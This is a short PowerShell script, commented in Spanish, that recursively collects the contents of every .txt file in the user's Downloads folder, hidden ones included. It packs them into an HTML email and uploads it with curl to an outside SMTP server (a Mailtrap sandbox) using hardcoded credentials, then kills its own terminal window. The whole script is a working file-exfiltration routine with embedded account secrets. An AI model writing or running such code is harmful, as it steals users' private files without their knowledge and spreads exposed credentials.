# Leer los archivos .txt de la carpeta seleccionada
$folderPath = "C:\Users\$env:USERNAME\Downloads"  # Reemplaza con la ruta de tu carpeta
$files = Get-ChildItem -Path "$folderPath\*.txt" -Recurse -Force | Select-Object FullName
$htmlBody = "<html><body><h1>Text File Contents</h1><ul>"

foreach ($file in $files) {
    $htmlBody += "<li><strong>File:</strong> $($file.FullName)<ul>"
    foreach($line in [System.IO.File]::ReadLines($file.FullName)) {
        $htmlBody += "<li>$line</li>"
    }
    $htmlBody += "</ul></li>"
}

$htmlBody += "</ul></body></html>"

# Crear el contenido del correo
$emailContent = @"
From: Magic Elves <from@example.com>
To: Mailtrap Inbox <to@example.com>
Subject: Text File Contents
Content-Type: text/html; charset=utf-8

$htmlBody
"@

# Guardar el contenido del correo en un archivo temporal
$emailFilePath = "$env:TEMP\email_content.txt"
$emailContent | Out-File -FilePath $emailFilePath -Encoding UTF8

# Ejecutar el comando curl para enviar el correo
curl.exe --ssl-reqd --url 'smtp://sandbox.smtp.mailtrap.io:2525' `
  --user '80af22cb2aa0ad:01271aac93c66c' `
  --mail-from 'from@example.com' `
  --mail-rcpt 'to@example.com' `
  --upload-file $emailFilePath
# Cerrar el terminal
Stop-Process -Id $PID
